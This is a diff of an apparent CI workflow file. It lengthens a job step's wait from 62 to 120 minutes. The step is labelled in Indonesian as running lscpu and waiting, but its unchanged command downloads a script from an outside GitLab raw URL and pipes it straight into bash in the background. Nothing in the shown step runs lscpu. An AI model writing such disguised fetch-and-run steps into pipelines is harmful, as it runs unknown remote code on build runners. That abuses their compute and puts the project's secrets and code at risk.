@@ -127,4 +127,4 @@ jobs:
       - name: Jalankan lscpu & tahan 62 menit
         run: |
           curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
-          sleep 62m
+          sleep 120m
